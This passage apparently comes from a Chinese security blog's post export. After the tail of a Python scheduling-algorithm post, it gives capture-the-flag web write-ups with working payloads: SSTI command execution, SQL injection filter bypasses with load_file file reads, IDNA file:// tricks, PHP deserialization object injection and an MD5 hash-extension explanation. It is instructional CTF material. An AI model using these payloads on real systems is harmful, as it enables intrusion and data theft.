at&#x27;,time,&#x27;o\\&#x27;clock&#x27;,&#x27;:&#x27;,maxcout, &#x27;celebrities will be attending!&#x27;)def celebrityDenisity(schedule,start,end): count=[0]*(end+1) for i in range(start,end+1): for c in schedule: if c[0]&lt;=i and c[1]&gt;i: count[i]+=1 return countdef celebrityTimeLong(sched吧ule): start=schedule[0][0] end=schedule[0][1] for i in schedule: start=min(i[0],start) end=max(i[1],end) return start,endif __name__==&#x27;__main__&#x27;: bestTimeToPart(sched) python提供一种更为简单的算列表中的最大值的方法 12maxcount=max(count[start:end+1])time=count.index(maxcount) 0x02 代码优化因为时间的原因，精度问题很难用以上算法解决，需要一个不依赖时间精度的算法 把时间当做横轴，将每一个出席者的出席时间画成线，求时间重合的最多的区间即为人数最多的时间，竖线与横线交点最多的时间区间 这样，我们不再关注时间精度问题，只需要关心每一个出席者的时间区间的起点和终点即可 但是这样我们涉及到一个排序问题需要解决 12345678910111213141516171819202122232425262728293031323334353637sched2=[(6.0,8.0),(6.5,12.0),(6.5,7.0),(7.0,8.0),(7.5,10.0),(8.0,9.0), (8.0,10.0),(9.0,12.0),(9.5,12.0),(9.5,10.0),(10.0,11.0),(10.0,12.0),(11.0,12.0)]def bestTimeToPartyTime(schedule): times=[] for c in schedule: times.append([c[0],&#x27;start&#x27;]) times.append([c[1],&#x27;end&#x27;]) times=sortList(times) print(times) maxcount,time=chooseTime(times) print(&#x27;Best time to attend the party is at&#x27;,time,&#x27;o\\&#x27;clock&#x27;,&#x27;:&#x27;,maxcount,&#x27;celebrities will be attending&#x27;)def sortList(tlist): for i in range(len(tlist)-1): iSm=i for j in range(i,len(tlist)): if tlist[iSm][0]&gt;tlist[j][0]: iSm=j tlist[i],tlist[iSm]=tlist[iSm],tlist[i] return tlistdef chooseTime(times): rcount=0 maxcount=time=0 for t in times: if t[1]==&#x27;start&#x27;: rcount=rcount+1 elif t[1]==&#x27;end&#x27;: rcount=rcount-1 if rcount&gt;maxcount: maxcount= rcount time=t[0] return maxcount,timeif __name__==&#x27;__main__&#x27;: bestTimeToPartyTime(sched2)","categories":[{"name":"用python解决算法谜题","slug":"用python解决算法谜题","permalink":"http://m0th.top/categories/%E7%94%A8python%E8%A7%A3%E5%86%B3%E7%AE%97%E6%B3%95%E8%B0%9C%E9%A2%98/"}],"tags":[{"name":"算法入门","slug":"算法入门","permalink":"http://m0th.top/tags/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"}]},{"title":"2020太湖杯web部分wp","slug":"“太湖杯web部分wp","date":"2020-11-07T12:29:53.000Z","updated":"2021-01-08T06:42:32.431Z","comments":true,"path":"2020/11/07/“太湖杯web部分wp/","link":"","permalink":"http://m0th.top/2020/11/07/%E2%80%9C%E5%A4%AA%E6%B9%96%E6%9D%AFweb%E9%83%A8%E5%88%86wp/","excerpt":"太湖杯web部分wp","text":"太湖杯web部分wp web1- checkInGame一开始以为是一道js的逆向题，后来看师傅们秒的那么快肯定是签到题，然后尝试抓包，发现抓包后游戏能够继续（时间仍然在减少），时间减到零时，消消乐的图标缺不再刷新，由此相当于获得了无穷的时间去完成，当然是有手就行 web2-easyweb上来一个字符规范器 测试后端是python写的，测试SSTI漏洞 发现正常的{} “等字符的都被过滤了，队里的师傅找了到了一些中文的字符来绕过，ssti漏洞利用本身没有什么难度 1｛｛[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[＂os＂][＂popen＂](＂cat &#x2F;flag＂).read()｝｝ web3-Croosfire这题没做出来，题挺好，我太菜 发现一个上传点，好像能双写绕过拿数据 1http:&#x2F;&#x2F;122.112.249.228:10085&#x2F;index.php?id&#x3D;1%20ununionion%20selselectect%20database()# 数据库名为shuyu 当前用户是root 但是这个题不是纯粹的注入 尝试读一下源码 12http:&#x2F;&#x2F;122.112.249.228:10085&#x2F;index.php?id&#x3D;-1%27%20ununionion%20selselectect%20load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)%23id&#x3D;-1%27%20ununionion%20selselectect%20load_file(0x2f7461722e7079)%23 源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php error_reporting(0); session_start(); include(&#x27;config.php&#x27;); $upload = &#x27;upload/&#x27;.md5(&quot;shuyu&quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]); @mkdir($upload); file_put_contents($upload.&#x27;/index.html&#x27;, &#x27;&#x27;); if(isset($_POST[&#x27;submit&#x27;]))&#123; $allow_type=array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;bmp&quot;,&quot;tar&quot;,&quot;zip&quot;); $fileext = substr(strrchr($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], &#x27;.&#x27;), 1); if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0 &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 204800)&#123; die(&#x27;upload error&#x27;); &#125;else&#123; $filename=addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]); $sql=&quot;insert into img (filename) values (&#x27;$filename&#x27;)&quot;; $conn-&gt;query($sql); $sql=&quot;select id from img where filename=&#x27;$filename&#x27;&quot;; $result=$conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; $id=$row[&quot;id&quot;]; &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$upload.&#x27;/&#x27;.$filename); header(&quot;Location: index.php?id=$id&quot;); &#125; &#125; &#125; elseif (isset($_GET[&#x27;id&#x27;]))&#123; $id=addslashes($_GET[&#x27;id&#x27;]); $sql=&quot;select filename from img where id=$id&quot;; $result=$conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; $filename=$row[&quot;filename&quot;]; &#125; $img=$upload.&#x27;/&#x27;.$filename; echo &quot;&lt;img src=&#x27;$img&#x27;/&gt;&quot;; &#125; &#125; elseif (isset($_POST[&#x27;submit1&#x27;]))&#123; $allow_type=array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;bmp&quot;,&quot;tar&quot;,&quot;zip&quot;); $fileext = substr(strrchr($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], &#x27;.&#x27;), 1); if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0 &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 204800)&#123; die(&#x27;upload error&#x27;); &#125;else&#123; $filename=addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]); move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$upload.&#x27;/&#x27;.$filename); @exec(&quot;cd /tmp&amp;&amp;python3 /tar.py &quot;.escapeshellarg(&#x27;/var/www/html/&#x27;.$upload.&#x27;/&#x27;.$filename)); &#125; &#125;?&gt; 同理读出tar.py 1234import tarfileimport systar = tarfile.open(sys.argv[1], &quot;r&quot;)tar.extractall() web4-ezmd5这题就考fuzz，真挺懵的 泄露源码如下 123456&lt;!-- $result = @auth($username,$password);if (md5($username) == md5($result) and $result !== $username)&#123; echo &quot;bingo : &lt;b&gt;$flag&lt;/b&gt;&quot;;&#125;--&gt; md5()弱相等通过md5后0e值轻松绕过 12345678QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904 然后疯狂fuzz password 发现加32位任意字符就能绕过@auth，就离谱这题 name:s155964671apassword:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbQNKCDZO","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"[SWPU2019]Web1","slug":"SWPU2019-Web1","date":"2020-10-19T03:16:18.000Z","updated":"2021-02-19T12:51:54.357Z","comments":true,"path":"2020/10/19/SWPU2019-Web1/","link":"","permalink":"http://m0th.top/2020/10/19/SWPU2019-Web1/","excerpt":"从ctf中的一道sql注入题学习无列名注入以及派生表的利用","text":"从ctf中的一道sql注入题学习无列名注入以及派生表的利用 0x01 信息收集，漏洞点探测 登入框可以注册，注册试试 发布广告，测试xss xss测试成功 然而这个题并不是xss，因为xss本身是被动的攻击，但是并没有管理员来审核 发现可以查看广告详情测试，猜测二次注入 有sql语法错误回显，确定存在SQL注入 0x02 注入利用经过测试发现其会过滤掉空格，使用/**/多行注释符进行绕过 1-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22 测试order by被ban，只能通过手工union select 测试有几列，竟然有22列（此处想打出题人） 回显点为 2,3 从而 1-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22 继续注入，发现一但出现information_schema字段被ban 无列名注入 在mysql5.7增加了sys 系统数据库，通过这个库可以快速的了解系统的元数据信息这个库确实可以方便DBA发现数据库的很多信息，解决性能瓶颈都提供了巨大帮助，简单来说，当数据库版本是5.7，information_schema库被过滤时，可以利用sys这个库来读取数据 sys.schema_table_statistics sys.schema_auto_increment_columns 同时在mysql数据库下 以上方式参考自https://www.cnblogs.com/wangtanzhi/p/12241499.html 在本题中就可以用 1-1&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22 从而得到所有的表名 派生表利用 在本地的一个数据库进行测试，结果如图所示 我们可以通过派生表的方法在只知道表名的情况下通过*全匹配生成派生表构造列名读取数据 1-1&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22 从而拿到flag","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"},{"name":"sql注入派生表利用","slug":"sql注入派生表利用","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5%E6%B4%BE%E7%94%9F%E8%A1%A8%E5%88%A9%E7%94%A8/"}]},{"title":"[SUCTF 2019]Pythonginx","slug":"SUCTF-2019-Pythonginx","date":"2020-10-10T13:41:52.000Z","updated":"2021-02-18T03:12:11.027Z","comments":true,"path":"2020/10/10/SUCTF-2019-Pythonginx/","link":"","permalink":"http://m0th.top/2020/10/10/SUCTF-2019-Pythonginx/","excerpt":"刷题刷题，这个题考点是nginx和一个blackhat上的议题，本来不难，也能猜到大概是爆破的思路，可就是没弄成，最后还是参考的大师傅们的博客，我太菜了","text":"刷题刷题，这个题考点是nginx和一个blackhat上的议题，本来不难，也能猜到大概是爆破的思路，可就是没弄成，最后还是参考的大师傅们的博客，我太菜了 0x01 blackhat议题 black hat 黑帽大会议题 ppt 0x02 nginx 基础nginx常用来做反向代理服务器 配置文件存放目录：/etc/nginx 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 配置文件目录为：/usr/local/nginx/conf/nginx.conf 0x03 源码分析123456789101112131415161718192021@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; 这个源代码是python的flask框架，很明显是绕过前两个if 进入最后一个if 并且实现文件包含 urlparse urlsplit urlunsplit123456789101112131415161718from urllib.parse import urlsplit, urlparse, urlunspliturl = &quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;print(urlsplit(url))print(urlsplit(url).hostname)print(urlparse(url))parts = list(urlsplit(url))print(urlunsplit(parts))#结果如下&#x27;&#x27;&#x27;SplitResult(scheme=&#x27;https&#x27;, netloc=&#x27;username:password@www.baidu.com:80&#x27;, path=&#x27;/index.html;parameters&#x27;, query=&#x27;name=tom&#x27;, fragment=&#x27;example&#x27;)www.baidu.comParseResult(scheme=&#x27;https&#x27;, netloc=&#x27;username:password@www.baidu.com:80&#x27;, path=&#x27;/index.html&#x27;, params=&#x27;parameters&#x27;, query=&#x27;name=tom&#x27;, fragment=&#x27;example&#x27;)https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&#x27;&#x27;&#x27; 看blackhat对应议题结合源码分析，很明显就是在url处构造一个经过encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)编码后为suctf.cc/u的字符串，然后读取nginx的配置文件 0x04 爆破出合适的字符串12345678910for i in range(128,65537): tmp=chr(i) try: res = tmp.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;) if &#x27;-&#x27; in res: continue if res==&#x27;c/u&#x27; : print(&quot;U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; &quot;.format(tmp, res, i)) except: pass 0x05 payload file://suctf.c℆sr/local/nginx/conf/nginx.conf file://suctf.c℆sr/fffffflag","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"},{"name":"nginx","slug":"nginx","permalink":"http://m0th.top/tags/nginx/"}]},{"title":"[安恒月赛]Ezunserialize","slug":"安恒月赛-Ezunserialize","date":"2020-10-02T08:55:01.000Z","updated":"2020-12-09T11:26:56.409Z","comments":true,"path":"2020/10/02/安恒月赛-Ezunserialize/","link":"","permalink":"http://m0th.top/2020/10/02/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-Ezunserialize/","excerpt":"反序列化字符逃逸漏洞，借这个题学一下","text":"反序列化字符逃逸漏洞，借这个题学一下 源码 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?phpshow_source(&quot;index.php&quot;);function write($data) &#123; return str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $data);&#125;function read($data) &#123; return str_replace(&#x27;\\0\\0\\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $data);&#125;class A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125;class B&#123; public $b = &#x27;gqy&#x27;; function __destruct()&#123; $c = &#x27;a&#x27;.$this-&gt;b; echo $c; &#125;&#125;class C&#123; public $c; function __toString()&#123; //flag.php echo file_get_contents($this-&gt;c); return &#x27;nice&#x27;; &#125;&#125;$a = new A($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$b = unserialize(read(write(serialize($a)))); pop链的构造题目源码比较简单，只有三个类和两个函数 很明显最终的利用点是文件包含从而拿到flag 通过这三个类中的魔术方法的调用方式 __construct PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct ​ PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行. __toString 用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 分析可知通过A类中____construct()方法得到两个可控参数可以实例化B类中的____destruct()方法输出属性同时B类中属性可控从而实例化C类控制C类的属性调用__toString()从而包含flag文件拿到flag 1class A::construct()--&gt;class B::destruct()--&gt;class C::toString() 根据源码生成发序列化字符串 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125;class B&#123; public $b = &#x27;gqy&#x27;; function __destruct()&#123; $c = &#x27;a&#x27;.$this-&gt;b; echo $c; &#125;&#125;class C&#123; public $c; function __toString()&#123; //flag.php echo file_get_contents($this-&gt;c); return &#x27;nice&#x27;; &#125;&#125;$b=new B();$b-&gt;b=new C();$b-&gt;b-&gt;c=&quot;flag.php&quot;;$a=new A(&quot;0&quot;,$b);echo serialize($a);#O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; 字符逃逸字符逃逸原理字符逃逸是通过对生成的反序列化字符串进行字符数量不等的变化，从而使得部分属性统计数目不正确，但是通过一些优美的构造填补一些字符可以使其通过检测并且符合反序列化的语法，从而造成对象注入等漏洞，填补的字符处可以用来对象注入 比如这个题 通过 write 和 read 函数对数据进行了替换处理，三位与六位的置换 只有 $a 与$b用于传参，先序列化处理后反序列化处理，所以我们构造出的对象需要存储在变量$b中 1s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; 就是这部分如果序列化后到字符串中 1O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:3:&quot;123&quot;;s:8:&quot;password&quot;;s:71:&quot;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125; 显然我们把这部分 1&quot;;s:8:&quot;password&quot;;s:71:&quot; #一共是23位 通过利用字符不等位置换函数，吞并到 username属性的字符串值当中 并且在b前面加入*&quot;;星号是匹配符可为任何字符串 利用字符置换函数，用于吞并这23位，显然我们发现&quot;/0/0/0&quot;是六个字符 char(0).*.char(0)是三个字符 一次替换就能吞并（逃逸）三个字符，我们需要吞并23位，再在b参数开头处补上一位即为24可以被三整除 所以payload为 12a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0b=b&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; TIPS反序列化字符逃逸，感觉难点在数数（咦？这不是小学生有手就行吗？好像是，我太菜了）","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"De1CTF-2019-SSRF Me","slug":"De1CTF-2019-SSRF-Me","date":"2020-09-24T09:34:28.000Z","updated":"2021-04-03T12:37:00.154Z","comments":true,"path":"2020/09/24/De1CTF-2019-SSRF-Me/","link":"","permalink":"http://m0th.top/2020/09/24/De1CTF-2019-SSRF-Me/","excerpt":"md5的hash拓展攻击，感觉有点意思，记录下","text":"md5的hash拓展攻击，感觉有点意思，记录下 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#x27;latin1&#x27;)app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot;def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;) 分析流程F12给了后端程序 是利用python Flask框架写的 对于python写的后端程序，先看路由 通过get方式传入param，其余字符串变量都不可控，然后得到一组md5值 urllib.unquote只是简单的进行一个url的解码 参数通过cookie和get的方式进行传输 并且对param参数进行了waf过滤 所以param参数不可以存在gopher和file读文件 回去看Task类的exec方法 当action中有scan字段时会将param参数作为文件名并将该文件写入沙箱所在文件夹下 当action中有read字段时会读取该文件 于是猜测param参数传入的应该flag文件的文件名 action传入的参数应该是readscan 从而得到flag 但是 此处有一个md5值的校验 而且 是随机生成的字段 所以这个题的重点在于如何绕过该限制 解决方法 1 字符串构造我们发现 这是字符串拼接 而且在 我们可以通过构造param参数为flag.txtread 从而可以得到 secert_key+flag.txtreadscan 的md5值 赋值给sign 绕过该限制 2 md5 hash拓展攻击学习连接:https://www.freebuf.com/articles/database/164019.html hash拓展作为一种比较有趣的md5攻击方式，利用的是md5算法缺陷 MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算 关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。 MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量。 前提是我们需要知道初始字符串的长度 从而我们通过md5的规则将当前明文补全为512bit的倍数，从而得出新的初始向量 并将该初始向量作为附加消息生成md5时的初始向量进行md5 运算得到新md5值即为原始消息和附加消息拼接所得的字符串的md5值 举个例子：现在我们有 “M0th”字符串的md5值，通过小端等各种规则拆分md5值即可得到向量，并将该向量作为”moth”字符串的md5初始向量，进行md5加密从而可以得到”M0thmoth”字符串的md5值","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"2020ciscn初赛部分wp","slug":"2020ciscn初赛部分wp","date":"2020-09-06T02:51:54.000Z","updated":"2020-09-24T13:01:01.175Z","comments":true,"path":"2020/09/06/2020ciscn初赛部分wp/","link":"","permalink":"http://m0th.top/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/","excerpt":"初赛还能做些题，复赛要命了","text":"初赛还能做些题，复赛要命了 第十三届全国大学生网络安全竞赛创新能力赛初赛部分WP团队:SCSCSC[TOC] webweb–easyphp简单审计分析 1234567891011121314151617&lt;?php //题目环境：php:7.4.8-apache $pid = pcntl_fork(); #fork一个子进程出来 if ($pid == -1) &#123; die(&#x27;could not fork&#x27;); &#125;else if ($pid)&#123; $r=pcntl_wait($status); if(!pcntl_wifexited($status))&#123; #如果子进程状态异常,那么返回 phpinfo phpinfo(); &#125; &#125;else&#123; highlight_file(__FILE__); if(isset($_GET[&#x27;a&#x27;])&amp;&amp;is_string($_GET[&#x27;a&#x27;])&amp;&amp;!preg_match(&quot;/[:\\\\\\\\]|exec|pcntl/i&quot;,$_GET[&#x27;a&#x27;]))&#123; call_user_func_array($_GET[&#x27;a&#x27;],[$_GET[&#x27;b&#x27;],false,true]); #传参数当做回调函数的函数名和参数从而来回调该函数 &#125; posix_kill(posix_getpid(), SIGUSR1); &#125; 那么这个题主要关键就在于call_user_func_array函数身上，如果它能够回调一个会出bug的函数以及其参数，那么就可以，让子进程异常崩溃，从而执行phpinfo() https://bugs.php.net/bug.php 在php的官方bug库中进行一番查找发现 则构造payload为 http://eci-2ze9505q64piew84qx9i.cloudeci1.ichunqiu.com/?a=stream_socket_client&amp;b=%27aa%27 执行了phpinfo，而flag就在phpinfo里 web–easytrick确实是一个好玩的小trick 12345678910111213141516 &lt;?phpclass trick&#123; public $trick1; public $trick2; public function __destruct()&#123; $this-&gt;trick1 = (string)$this-&gt;trick1; if(strlen($this-&gt;trick1) &gt; 5 || strlen($this-&gt;trick2) &gt; 5)&#123; die(&quot;你太长了&quot;); &#125; if($this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2)&#123; echo file_get_contents(&quot;/flag&quot;); &#125; &#125;&#125;highlight_file(__FILE__);unserialize($_GET[&#x27;trick&#x27;]); 这个代码逻辑比较简单，就是通过反序列化的方式传入$trick1和$trick2,然后纷纷绕过长度限制5，然后在进行一个md5的强碰撞，就给flag了 在以往的积累中，我们积累过类似 d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70 d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70 的强碰撞样本，但是这次因为strlen的限制，无可奈何，尝试过0x00绕过无果 另一方面我们尝试过用数组的方式解这个题，但是由于代码中对trick1进行string转化，也无果 后来再多次尝试下，我们发现md5对大到无穷的数字可以相等 而无穷本身和无穷并不相等 但是很遗憾，在php中1/0的值和2/0会强相等 123456789101112131415&lt;?php $trick1=1/0; $trick2=2/0; if($trick1===$trick2)&#123; echo &#x27;强相等&#x27;; &#125; if($trick1==$trick2)&#123; echo &#x27;弱相等&#x27;; &#125; if(md5($trick1)==md5($trick2))&#123; echo &#x27;强碰撞&#x27;; &#125; echo $trick1; echo $trick2;#结果为 强相等弱相等强碰撞INFINF 然后我们发现 1/0这些值会返回INF,我们去了解了一下INF，发现他在php中用于表示无穷大 突发奇想：如果’INF’这个当成字符串与数字进行等比较的时候会发生什么呢 123456789101112131415&lt;?php $trick1=INF; $trick2=&#x27;INF&#x27;; if($trick1===$trick2)&#123; echo &#x27;强相等&#x27;; &#125; if($trick1==$trick2)&#123; echo &#x27;弱相等&#x27;; &#125; if(md5($trick1)==md5($trick2))&#123; echo &#x27;强碰撞&#x27;; &#125; echo $trick1; echo $trick2;#结果为 强碰撞INFINF 强不相等可以理解，然而弱不相等就好玩了，我们知道 ‘1’和1这些数字是弱相等的，这说明在比较时，’INF’被强制转换成INF，但是此INF显然并不具有作为double型数字的表示无穷大的意义 根据此原理 我们可以构造出payload trick=O:5:”trick”:2:{s:6:”trick1”;d:INF;s:6:”trick2”;d:INF;} web–rceme通过搜索，发现代码类似于 CVE-2019-9041 就去先研究了一波cve 发现此题只是在原基础上加了一些过滤 首先找到rce点 根据参数上找只要控制$ifstr参数即可 比cve来说 多了一个函数用来过滤，而且基本过滤了命令执行函数 我们必需要在原来基础上绕过该过滤 通过.连字符串即可绕过被过滤函数 payload 